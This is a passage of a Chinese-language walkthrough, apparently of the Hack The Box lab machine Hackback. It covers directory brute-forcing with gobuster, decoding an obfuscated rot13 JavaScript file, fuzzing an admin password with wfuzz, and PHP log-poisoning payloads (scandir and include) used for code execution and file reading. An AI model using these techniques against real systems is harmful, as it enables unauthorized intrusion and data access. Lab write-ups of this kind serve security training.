+<h3 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h3><p>设置完成后分别访问四个域<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/19.png"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/20.png"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/21.png"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/22.png"><br>发现这些站点都是著名网站的登录界面，它们主要用于骗取受害人的登录信息，具体手法是通过发送包含钓鱼网站的电子邮件，受害者打开邮件访问这些站点输入账号密码后，就会被黑客获取到账号信息。查看数据包发现这些站点基于PHP和ASP.NET<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/23.png"></p>
+<h3 id="管理员登录界面"><a href="#管理员登录界面" class="headerlink" title="管理员登录界面"></a>管理员登录界面</h3><p>admin.hackback.htb 是一个不同于钓鱼网站的登录界面，查看页面源代码<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/24.png"><br>其中存在一个提示<code>&lt;script src=&quot;js/.js&quot;&gt;&lt;/script&gt;</code>，但是访问 js 目录显示403，通过 gobuster 扫描 js 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x js -t 50</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/25.png"><br>查看<code>private.js</code>发现如下内容<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/26.png"><br>一般在js中使用 var 来定义字符串，而这个js择使用 ine 来定义字符串，猜测可能是经过rot13编码后的js代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://admin.hackback.htb/js/private.js | tr <span class="string">&#x27;a-zA-Z&#x27;</span> <span class="string">&#x27;n-za-mN-ZA-M&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/27.png"></p>
+<p>放入<code>beautifier.io</code>中进行美化，获得如下 js 代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="string">&#x27;\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33&#x27;</span>, <span class="string">&#x27;\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d&#x27;</span>, <span class="string">&#x27;\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68&#x27;</span>];</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="function"><span class="keyword">function</span>(<span class="params">f</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--f) &#123;</span><br><span class="line">            c[<span class="string">&#x27;push&#x27;</span>](c[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    e(++d);</span><br><span class="line">&#125;(a, <span class="number">0x66</span>));</span><br><span class="line"><span class="keyword">var</span> b = <span class="function"><span class="keyword">function</span>(<span class="params">c, d</span>) </span>&#123;</span><br><span class="line">    c = c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> e = a[c];</span><br><span class="line">    <span class="keyword">if</span> (b[<span class="string">&#x27;MsULmv&#x27;</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> f;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">var</span> g = <span class="built_in">Function</span>(<span class="string">&#x27;return\x20(function()\x20&#x27;</span> + <span class="string">&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;</span> + <span class="string">&#x27;);&#x27;</span>);</span><br><span class="line">                f = g();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (h) &#123;</span><br><span class="line">                f = <span class="built_in">window</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> i = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;</span><br><span class="line">            f[<span class="string">&#x27;atob&#x27;</span>] || (f[<span class="string">&#x27;atob&#x27;</span>] = <span class="function"><span class="keyword">function</span>(<span class="params">j</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">var</span> k = <span class="built_in">String</span>(j)[<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/=+$/</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">0x0</span>, m, n, o = <span class="number">0x0</span>, p = <span class="string">&#x27;&#x27;</span>; n = k[<span class="string">&#x27;charAt&#x27;</span>](o++); ~n &amp;&amp; (m = l % <span class="number">0x4</span> ? m * <span class="number">0x40</span> + n : n, l++ % <span class="number">0x4</span>) ? p += <span class="built_in">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](<span class="number">0xff</span> &amp; m &gt;&gt; (-<span class="number">0x2</span> * l &amp; <span class="number">0x6</span>)) : <span class="number">0x0</span>) &#123;</span><br><span class="line">                    n = i[<span class="string">&#x27;indexOf&#x27;</span>](n);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;());</span><br><span class="line">        <span class="keyword">var</span> q = <span class="function"><span class="keyword">function</span>(<span class="params">r, d</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> t = [],</span><br><span class="line">                u = <span class="number">0x0</span>,</span><br><span class="line">                v, w = <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                x = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            r = atob(r);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> y = <span class="number">0x0</span>, z = r[<span class="string">&#x27;length&#x27;</span>]; y &lt; z; y++) &#123;</span><br><span class="line">                x += <span class="string">&#x27;%&#x27;</span> + (<span class="string">&#x27;00&#x27;</span> + r[<span class="string">&#x27;charCodeAt&#x27;</span>](y)[<span class="string">&#x27;toString&#x27;</span>](<span class="number">0x10</span>))[<span class="string">&#x27;slice&#x27;</span>](-<span class="number">0x2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            r = <span class="built_in">decodeURIComponent</span>(x);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> A = <span class="number">0x0</span>; A &lt; <span class="number">0x100</span>; A++) &#123;</span><br><span class="line">                t[A] = A;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (A = <span class="number">0x0</span>; A &lt; <span class="number">0x100</span>; A++) &#123;</span><br><span class="line">                u = (u + t[A] + d[<span class="string">&#x27;charCodeAt&#x27;</span>](A % d[<span class="string">&#x27;length&#x27;</span>])) % <span class="number">0x100</span>;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">            &#125;</span><br><span class="line">            A = <span class="number">0x0</span>;</span><br><span class="line">            u = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> B = <span class="number">0x0</span>; B &lt; r[<span class="string">&#x27;length&#x27;</span>]; B++) &#123;</span><br><span class="line">                A = (A + <span class="number">0x1</span>) % <span class="number">0x100</span>;</span><br><span class="line">                u = (u + t[A]) % <span class="number">0x100</span>;</span><br><span class="line">                v = t[A];</span><br><span class="line">                t[A] = t[u];</span><br><span class="line">                t[u] = v;</span><br><span class="line">                w += <span class="built_in">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](r[<span class="string">&#x27;charCodeAt&#x27;</span>](B) ^ t[(t[A] + t[u]) % <span class="number">0x100</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> w;</span><br><span class="line">        &#125;;</span><br><span class="line">        b[<span class="string">&#x27;OoACcd&#x27;</span>] = q;</span><br><span class="line">        b[<span class="string">&#x27;qSLwGk&#x27;</span>] = &#123;&#125;;</span><br><span class="line">        b[<span class="string">&#x27;MsULmv&#x27;</span>] = !![];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> C = b[<span class="string">&#x27;qSLwGk&#x27;</span>][c];</span><br><span class="line">    <span class="keyword">if</span> (C === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (b[<span class="string">&#x27;pIjlQB&#x27;</span>] === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            b[<span class="string">&#x27;pIjlQB&#x27;</span>] = !![];</span><br><span class="line">        &#125;</span><br><span class="line">        e = b[<span class="string">&#x27;OoACcd&#x27;</span>](e, d);</span><br><span class="line">        b[<span class="string">&#x27;qSLwGk&#x27;</span>][c] = e;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        e = C;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> z = b(<span class="string">&#x27;0x0&#x27;</span>, <span class="string">&#x27;\x50\x5d\x53\x36&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> h = b(<span class="string">&#x27;0x1&#x27;</span>, <span class="string">&#x27;\x72\x37\x54\x59&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> y = b(<span class="string">&#x27;0x2&#x27;</span>, <span class="string">&#x27;\x44\x41\x71\x67&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> t = <span class="string">&#x27;\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> i = <span class="string">&#x27;\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> k = <span class="string">&#x27;\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> w = <span class="string">&#x27;\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>这段代码将a设置为三个二进制 blob 的数组，使用 0x66 运行一个函数，定义函数 b 用于解码。将其放入本地 js 运行，也可在<code>tio.run</code>站点运行  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js </span><br><span class="line">&gt; var ...</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/28.png"><br>根据提示访问<code>2bb6916122f1da34dcd916421e531578</code>目录，直接访问会重定向回主目录。在该目录下访问其他路径会提示404，说明可能存在其他文件，在其中进行目录扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/big.txt -xphp -t 50</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/29.png"><br>发现webadmin.php，之后开始对参数进行构造，发现 acton=list 下会有回显密码错误</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=test&amp;session=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/30.png"><br>使用 wfuzz 对密码进行模糊测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -w /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt --hw 0 --hh 17 <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=FUZZ&amp;session=&#x27;</span> </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/31.png"><br>发现密码为12345678，使用该密码查看返回信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&amp;site=hackthebox&amp;password=12345678&amp;session=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/32.png"><br>成功返回日志，但是这是哪个站点的日志呢？经过测试后发现登录 hackthebox后会出现一个新的日志，其中sessionid就是我的内网地址<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/33.png"><br>将日志名设置为该seesionid同时修改action为show后可以获取日志内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=3c4b5b07fe829951a788d023036262fb6f49340d22959897bd937d096bc8183d&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=3c4b5b07fe829951a788d023036262fb6f49340d22959897bd937d096bc8183d&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/34.png"></p>
+<h2 id="0x02-上线-simple"><a href="#0x02-上线-simple" class="headerlink" title="0x02 上线[simple]"></a>0x02 上线[simple]</h2><h3 id="php日志中毒"><a href="#php日志中毒" class="headerlink" title="php日志中毒"></a>php日志中毒</h3><p>虽然无法知道知道它的真实路径，但是可以将php代码写入日志文件后查看。使用 BurpSuite 抓取 admin.hackthebox.htb 的登录数据包并修改用户名为php代码，将其作为代码执行点<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/35.png">查询日志记录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/36.png"><br>发现php代码成功执行，那么我们开始执行 whoami<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/37.png"><br>返回一个逗号说明 whoami 命令没起作用<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/38.png"><br>php可以列出和读取文件都是在 list 和 show 操作中完成的，在创建这些日志文件时也在写入文件。那么可以在执行点中通过函数 scandir 和 print_r 列出目录并打印结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> print_r(scandir(<span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/39.png"><br>在执行点中通过参数 show 传递 dir 命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -b <span class="string">&quot;PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&quot;</span> <span class="string">&#x27;http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&amp;site=hackthebox&amp;password=12345678&amp;session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&amp;dir=.&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/40.png"><br>成功返回当前目录文件名，在执行点中写入<code>&lt;?php include($_GET[&#39;file&#39;]);?&gt;</code>尝试进行文件读取<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/5f3c8f9c/41.png"></p>
